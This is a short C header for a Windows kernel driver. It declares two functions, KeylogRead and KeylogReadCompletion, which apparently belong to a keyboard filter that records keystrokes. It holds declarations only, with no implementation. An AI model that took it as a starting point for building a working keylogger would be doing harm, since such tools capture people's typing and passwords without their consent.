#pragma once

#include <ntddk.h>

NTSTATUS 
KeylogRead(
		IN PDEVICE_OBJECT DeviceObject, 
		IN PIRP irp
		);

NTSTATUS 
KeylogReadCompletion(
		IN PDEVICE_OBJECT DeviceObject, 
		IN PIRP irp, 
		IN PVOID Context
		);

